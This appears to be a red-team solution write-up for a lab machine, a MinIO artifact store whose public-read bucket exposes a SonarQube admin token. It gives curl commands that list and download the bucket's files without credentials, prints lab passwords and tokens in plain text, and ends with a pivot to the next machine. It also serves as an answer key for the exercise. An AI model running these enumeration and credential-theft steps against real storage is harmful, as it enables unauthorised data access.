# solve_red.md — M3 · dev-artifacts
## Red Team Solution Writeup
**Machine:** M3 — PUL Build Artifact Store
**Vulnerability:** Public S3 Bucket ACL Misconfiguration
**MITRE:** T1530 (Data from Cloud Storage Object)

---
## Objective
Using MinIO credentials from M2 (pul-build-svc:Artf@ct5tr!PUL24), access the PUL Build Artifact Store. Discover that the `pul-code-reports` bucket has a public-read ACL — listable and downloadable WITHOUT credentials. Find and download `sonarqube-access.env` containing the SonarQube admin token.

---
## Step-by-Step

### Step 1 — Discover Service
```bash
curl -s http://11.x.x.x:9000/pul-code-reports/ | head -30
```
No auth header sent — server returns S3 XML listing (bucket is public).

### Step 2 — List Public Bucket
```bash
curl -s "http://11.x.x.x:9000/pul-code-reports/?list-type=2"
```
XML response shows three objects including `sonar-integration/sonarqube-access.env`.

### Step 3 — Download Credential File
```bash
curl -s "http://11.x.x.x:9000/pul-code-reports/sonar-integration/sonarqube-access.env"
```
Output:
```
# PUL SonarQube Integration Credentials
SONAR_TOKEN=sqa_pul_admin_2024_gridfall
SONAR_HOST=11.x.x.x
SONAR_PORT=9200
SONAR_PROJECT_KEY=pul-firmware-ota
```

### Step 4 — (Bonus) Login to Management UI
```bash
# Login with MinIO creds from M2 to see all buckets
# Browse: http://11.x.x.x:9000/login
# Username: pul-build-svc | Password: Artf@ct5tr!PUL24
```

**Pivot:** `sqa_pul_admin_2024_gridfall` → M4 SonarQube Code Intelligence (`11.x.x.x:9200`)
